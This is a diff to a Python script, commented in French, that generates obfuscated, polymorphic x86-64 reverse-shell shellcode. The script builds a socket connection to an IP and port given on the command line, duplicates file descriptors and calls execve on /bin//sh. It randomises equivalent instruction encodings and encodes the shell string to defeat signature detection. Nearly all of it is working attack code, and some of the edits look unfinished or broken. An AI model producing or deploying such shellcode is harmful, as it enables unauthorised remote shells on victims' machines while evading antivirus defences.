@@ -29,8 +29,8 @@ def factorOffus(string4Payload):
         return string4Payload
 
     #Vérifie s'il n'y a pas "0x" au debut de la string
-    if string4Payload[0]+string4Payload[1] != "0x" :
-        string4Payload = "0x"+string4Payload
+    if string4Payload[0]+string4Payload[1] != "0" :
+        string4Payload = string4Payload
     
     #Tableau qui va recevoir les possibilités d'offuscation par addition ou soustraction
     arr = []
@@ -42,7 +42,7 @@ def factorOffus(string4Payload):
     for i in range(2,len(string4Payload),2): #Commence à 2 pour ignorer "0x" dans la chaine
 
         #Récupère la substring (valeur en hexa) par tranche de 2
-        sub ="0x"+string4Payload[i] + string4Payload[i+1]
+        sub =string4Payload[i] + string4Payload[i+1]
         numInHex = int(sub,16)
 
         #On vérifie l'addition ou la soustraction à la valeur récupéré de 1 à 15
@@ -77,11 +77,11 @@ def factorOffus(string4Payload):
 #Le "main" de l'offuscation, on va utiliser la valeur alétaoire et l'additionner à toutes les valeur par tanches de deux de la string en hexa
 def offus(string4Payload, rand):
     #On recinstitue une nouvelle chaine en hexa
-    newString = "0x"
+    newString = "" #"0x"
 
     #Vérifie s'il n'y a pas "0x" au debut de la string
-    if string4Payload[0]+string4Payload[1] != "0x" :
-        string4Payload = "0x"+string4Payload
+   # if string4Payload[0]+string4Payload[1] != "0x" :
+    #    string4Payload = "0x"+string4Payload
 
     #On boucle sur l'addition/soustraction avec notre coefficient pour obtenir notre nouvelle string
     for i in range(2,len(string4Payload),2):
@@ -105,7 +105,7 @@ def deOffus(factorOffusVar, string_to_deof):
         factorOffusVar *= -1 
         if factorOffusVar < 10 :
             for i in range(2, len(string_to_deof)):
-                addString+="0"+str(factorOffusVar)
+                addString+=str(factorOffusVar)
             return "4883eb"+addString
         
         elif factorOffusVar >= 10 :
@@ -118,7 +118,7 @@ def deOffus(factorOffusVar, string_to_deof):
             elif factorOffusVar == 15 : newFactor = "f"
 
             for i in range(2, len(string_to_deof)):
-                addString+="0"+str(newFactor)
+                addString+=str(newFactor)
 
             return "4883eb"+addString
         
@@ -127,7 +127,7 @@ def deOffus(factorOffusVar, string_to_deof):
         if factorOffusVar <= -10 :
 
             for i in range(1, len(string_to_deof)):
-                addString+="0"+str(factorOffusVar)
+                addString+=str(factorOffusVar)
 
             return "4883c3"+addString
         
@@ -141,7 +141,7 @@ def deOffus(factorOffusVar, string_to_deof):
             elif factorOffusVar == 15 : newFactor = "f"
 
             for i in range(1, len(string_to_deof)):
-                addString+="0"+str(newFactor)
+                addString+=str(newFactor)
 
             return "4883c3"+addString 
 
@@ -193,7 +193,7 @@ def create_socket():
     PAYLOAD += call()
 
 
-
+'''
 def socket_connect(ip, port):
    
    global PAYLOAD
@@ -273,6 +273,46 @@ def socket_connect(ip, port):
    add_string += call()
    PAYLOAD += add_string
    return PAYLOAD
+'''
+
+def deof_socket_connect(ip, port):
+    global PAYLOAD
+    l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+    PAYLOAD += l[r(0,len(l)-1)]   
+    clean("rax")
+    PAYLOAD += "B02A"
+    clean("rbx")
+    PAYLOAD += "53" # push rbx
+    ip_greater = []
+    ip_to_substract = []
+    cmp = 0
+    for ip in ip.split("."):
+        ip_to_substract.append(r(int(ip)+1, 255))
+        ip_greater.append(ip_to_substract[cmp] - int(ip))
+        cmp += 1
+
+    PAYLOAD += "BE" # mov esi
+    for i in range(0, len(ip_to_substract)):
+        if ip_to_substract[i] < 17: PAYLOAD += "0"
+        PAYLOAD += hex(ip_to_substract[i])[:2]
+
+    PAYLOAD += "81EE" # sub esi
+    for i in range(0,len(ip_greater)):
+        if ip_greater[i] < 17: PAYLOAD += "0"
+        PAYLOAD += hex(ip_greater[i])[:2]
+
+    
+    port = hex(socket.htons(int(port)))
+
+    PAYLOAD += "566668" # push
+    print("PAYLOAD : ", PAYLOAD)
+    PAYLOAD += str(port[-4:]) # Le port en little endian    
+    PAYLOAD += "666a02" #AF_INET
+    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"7
+    print("ouou",PAYLOAD)
+    PAYLOAD += "b218" # mov dl,24
+    PAYLOAD += call()
+    return PAYLOAD
 
 def dup2x3():
     global PAYLOAD
@@ -299,24 +339,22 @@ def shell():
     PAYLOAD+=clean("rdx")
 
     #Obrient le coefficient d'addition ou soustraction
-    factorOffusVar = factorOffus("0x68732f6e69622f2f")
+    factorOffusVar = factorOffus("68732f6e69622f2f")
 
     #Offusque la string
-    offuString = offus("0x68732f6e69622f2f",factorOffusVar)
+    offuString = offus("68732f6e69622f2f",factorOffusVar)
 
     #Inverse en mirroir tout la chaine pour op code
     offuString = offuString[::-1]
 
     PAYLOAD += "48bb"  #mov rbx, ...
-
-    """
+    '''
     for i in range(0,15,2):
         sub = offuString[i+1] + offuString[i] 
         PAYLOAD+= sub
-    """
     PAYLOAD+=offuString
+    '''
                     #.../bin/bash en hexa offusqué    
-
     
     #Déoffucation
     PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
@@ -330,7 +368,45 @@ def shell():
     PAYLOAD+="b03b" #mov al, 0x3b
     PAYLOAD+= call()
 
+def deof_shell():
+    global PAYLOAD
+    #String d'accueil offusquée 
+    addString = ""
 
+    #Clean les registres
+    PAYLOAD+=clean("rax")
+    PAYLOAD+=clean("rdx")
+
+    #Obrient le coefficient d'addition ou soustraction
+    #factorOffusVar = factorOffus("68732f6e69622f2f")
+
+    #Offusque la string
+    #offuString = offus("68732f6e69622f2f",factorOffusVar)
+
+
+    #Inverse en mirroir tout la chaine pour op code
+    #offuString = offuString[::-1]
+
+    PAYLOAD += "48bb2f2f62696e"  #mov rbx, ...
+    '''
+    for i in range(0,15,2):
+        sub = offuString[i+1] + offuString[i] 
+        PAYLOAD+= sub
+    PAYLOAD+=offuString
+    '''
+                    #.../bin/bash en hexa offusqué    
+    
+    #Déoffucation
+    #PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
+    PAYLOAD+="2f7368"
+    PAYLOAD+="4889e7" # mov rdi, rsp
+    PAYLOAD+="50" #push rax
+    PAYLOAD+="57" #push rdi
+    PAYLOAD+="4889e6" #mov rsi, rsp
+  
+    #Appel systeme
+    PAYLOAD+="b03b" #mov al, 0x3b
+    PAYLOAD+= call()
     
         
     
@@ -364,9 +440,11 @@ PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
 PAYLOAD += clean("rsi")
 create_socket()
-socket_connect(argv[1], argv[2])
+#connect_socket(argv[1], argv[2])
+deof_socket_connect(argv[1], argv[2])
 dup2x3()
-shell()
+#shell()
+#deof_shell()
 _exit()
 #print(bit_to_opcode(PAYLOAD))
 #print(PAYLOAD)
